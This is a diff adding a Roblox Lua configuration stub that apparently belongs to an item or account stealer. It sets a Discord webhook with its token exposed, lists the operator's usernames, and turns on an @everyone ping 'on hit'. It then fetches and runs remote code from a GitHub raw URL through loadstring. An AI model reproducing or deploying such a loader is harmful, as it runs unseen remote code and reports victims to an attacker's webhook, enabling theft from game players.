@@ -1,0 +1,9 @@
+-- SETTINGS
+_G.POOR_WEBHOOK = "https://discord.com/api/webhooks/1511079264026365963/jzexuDwohEYNveErni9m-LVtIyebfL2IuLbP2mC-Hp5WkQpT4kA4Zut000MGddedtBKd" -- Input Ur webhook Here
+_G.MY_USERNAMES = {"hisbestmistakexo", "thrqiccx", "socutesy69"} -- YOUR own usernames
+_G.PING_POOR = true -- True/False To Ping @Everyone ON HIT
+
+-- Load Main
+task.spawn(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/prodstar/scripts/refs/heads/main/Baddies", true))()
+end)
